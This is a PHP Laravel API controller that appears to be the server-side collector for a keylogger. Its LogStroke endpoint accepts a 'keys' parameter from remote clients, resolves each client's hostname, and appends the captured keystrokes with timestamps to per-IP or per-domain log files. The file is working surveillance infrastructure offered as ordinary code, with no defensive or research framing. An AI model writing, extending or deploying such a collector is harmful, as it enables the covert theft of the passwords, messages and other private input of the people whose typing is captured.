<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Carbon\Carbon;
use Illuminate\Contracts\Filesystem\FileNotFoundException;
use Illuminate\Http\Request;
use Storage;

class LoggerController extends Controller
{
    public function LogStroke(Request $request)
    {
        $client = gethostbyaddr($request->ip());
        $keys = $request->input('keys', '');

        if ($keys != null) {
            // If we were unable to find the IP address, go ahead and store it in a file named by the IP address
            if ($client == $request->ip()) {
                $path = "ip" . DIRECTORY_SEPARATOR . $client;

                // Create the folder structure if it doesn't exist
                Storage::disk()->append($path, '', '');
            } // Else we were able to parse out the dns name
            else {
                $path = "dns" . DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, array_reverse(explode(".", $client))) . ".log";

                // Create the folder structure if it doesn't exist
                Storage::disk()->append($path, '', '');
            }

            // Place the key logged information with a timestamp, new line on every minute
            try {
                if (Storage::disk()->get($path) != null) {
                    Storage::disk()->append($path, "\n", '');
                }
            } catch (FileNotFoundException $exception) {
                // Ignore
            }

            Storage::disk()->append($path, '[' . Carbon::now()->isoFormat('MMMM Do YYYY, h:mm:ss a') . '] ', '');
            Storage::disk()->append($path, $keys, '');
        }

        return response()->json([
            'status' => 'success',
        ]);
    }
}
